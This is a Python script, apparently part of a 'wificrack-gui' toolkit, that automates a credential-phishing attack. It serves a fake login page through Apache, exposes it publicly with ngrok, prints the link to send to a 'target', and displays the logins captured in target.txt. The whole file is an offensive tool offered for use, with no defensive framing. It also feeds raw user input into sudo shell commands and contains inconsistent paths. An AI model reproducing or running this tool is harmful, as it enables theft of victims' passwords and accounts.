import os
from time import sleep


p = input("did you install ngrok y/n: ")
if p == "y":
    y = input("where ngrok file to start: ")
    yuw = input("website phising default/custom: ")
    if yuw == "default":
        print("start website....")
        sleep(5)
        print("start apache2...")
        os.system("sudo service apache2 start")
        oa = input("did you have phising file on /var/www/html y/n: ")
        if oa == "y":
            os.system("sudo cp -r /opt/wificrack-gui/lib/web/login.php /var/www/html && cd /var/www/html && sudo rm -rf login && sudo mkdir login && sudo chmod 777 login && sudo mv login.php login && cd")
            print("start ngrok..")
            sleep(5)
            i = input("what your name linux account: ")
            os.system("cd / && konsole --hold --geometry 600x500 -e ./home/" + i + "/" + y + " http 80 &")
            sleep(3)
            os.system("clear")
            print("copy link quick 20 secoond if error do not ctrl+c")
            sleep(20)
            os.system("clear")
            yp = input("link: ")
            print("wait link gonna send..")
            sleep(5)
            print(yp + "/login/login.php")
            yu = input("open file or not y/n: ")
            if yu == "y":
                print("close windows file if target found")
                os.system("thunar /var/www/html/login")
                yes = input("did target login? y/n: ")
                if yes == "y":
                    s = input("see on terminal? y/n: ")
                    if s == "y":
                        os.system("cd && cat /var/www/html/phising/target.txt")
                    elif s == "n":
                        exit()
                    else:
                        print("exit")
                        exit()
                elif yes == "n":
                    print("check on /var/www/html/login (target.txt)")
                else:
                    print("exit")
                    exit()
            elif yu == "n":
                exit()
            else:
                exit()
        elif oa == "n":
            os.system("cd && sudo cp -r /opt/wificrack-gui/lib/web/login.php /var/www/html && cd /var/www/html && sudo mkdir login && sudo chmod 777 login && sudo mv login.php login && cd")
            print("start ngrok..")
            sleep(5)
            i = input("what your name linux account: ")
            os.system("cd / && konsole --hold --geometry 600x500 -e ./home/" + i + "/" + y + " http 80 &")
            sleep(3)
            os.system("clear")
            print("copy link quick 20 secoond if error do not ctrl+c")
            sleep(20)
            os.system("clear")
            yp = input("link: ")
            print("wait link gonna send..")
            sleep(5)
            print(yp + "/login/login.php")
            yu = input("open file or not y/n: ")
            if yu == "y":
                print("close windows file if target found")
                os.system("thunar /var/www/html/login")
                yes = input("did target login? y/n: ")
                if yes == "y":
                    s = input("see on terminal? y/n: ")
                    if s == "y":
                        os.system("cd && cat /var/www/html/login/target.txt")
                    elif s == "n":
                        exit()
                    else:
                        print("exit")
                        exit()
                elif yes == "n":
                    print("check on /var/www/html/login (target.txt)")
                else:
                    print("exit")
                    exit()
            elif yu == "n":
                exit()
            else:
                exit()
    elif yuw == "custom":
        ps = input("add new file: ")
        print("exemple: phising.php or phising.html")
        what = input("name file your website: ")
        print("start website....")
        sleep(5)
        oa = input("did you have " + ps + " file on /var/www/html y/n: ")
        if oa == "y":
            os.system("sudo cp -r /opt/wificeack-gui/lib/web/" + what + " /var/www/html && cd /var/www/html && sudo rm -rf " + ps + " && sudo mkdir " + ps +" && sudo chmod 777 "+ ps + " && sudo mv " + what + " " + ps + " && cd")
            print("start ngrok..")
            sleep(5)
            i = input("what your name linux account: ")
            os.system("cd / && konsole --hold --geometry 600x500 -e ./home/" + i + "/" + y + " http 80 &")
            sleep(3)
            os.system("clear")
            print("copy link quick 20 secoond if error do not ctrl+c")
            sleep(20)
            os.system("clear")
            yp = input("link: ")
            print("wait link gonna send..")
            sleep(5)
            print(yp + "/" + ps + "/"+ what)
            yu = input("open file or not y/n: ")
            if yu == "y":
                print("close windows file if target found")
                os.system("thunar /var/www/html/" + ps)
                yes = input("did target login? y/n: ")
                print ("good you can check on text editor or something")
            elif yu == "n":
                exit()
            else:
                exit()
        elif oa == "n":
            os.system("sudo cp -r /opt/wificrack-gui/lib/web/"+ what +" /var/www/html && cd /var/www/html && sudo mkdir "+ ps +" && sudo chmod 777 "+ ps +" && sudo mv " + what + " "+ ps + " && cd")
            print("start ngrok..")
            sleep(5)
            print("start apache2...")
            os.system("sudo service apache2 start")
            i = input("what your name linux account: ")
            os.system("cd / && konsole --hold --geometry 600x500 -e ./home/" + i + "/" + y + " http 80 &")
            sleep(3)
            os.system("clear")
            print("copy link quick 20 secoond if error do not ctrl+c")
            sleep(20)
            os.system("clear")
            yp = input("link: ")
            print("wait link gonna send..")
            sleep(5)
            print(yp + "/" + ps + "/"+ what)
            yu = input("open file or not y/n: ")
            if yu == "y":
                print("close windows file if target found")
                os.system("thunar /var/www/html/"+ ps)
                yes = input("did target login? y/n: ")
                if yes == "y":
                    print("good now you can check with text editor or something")
                elif yes == "n":
                    print("check on /var/www/html/" + ps)
                else:
                    print("exit")
                    exit()
            elif yu == "n":
                exit()
            else:
                exit()

elif p == "n":
    print("copy this to your browser and download it")
    print ("https://ngrok.com/download")